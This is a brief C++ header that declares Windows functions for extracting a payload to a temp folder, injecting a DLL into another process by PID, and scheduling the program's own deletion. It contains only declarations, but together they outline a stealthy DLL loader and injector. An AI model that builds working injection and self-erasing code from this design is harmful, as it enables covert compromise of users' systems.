#pragma once

#include <windows.h>
#include <string>

namespace deltass {

	bool ExtractPayloadToTemp(std::wstring& outPath);
	void CleanupPayload(const std::wstring& path);
	bool InjectPayloadIntoProcess(DWORD pid, const std::wstring& dllPath);
	void ScheduleSelfDelete();

}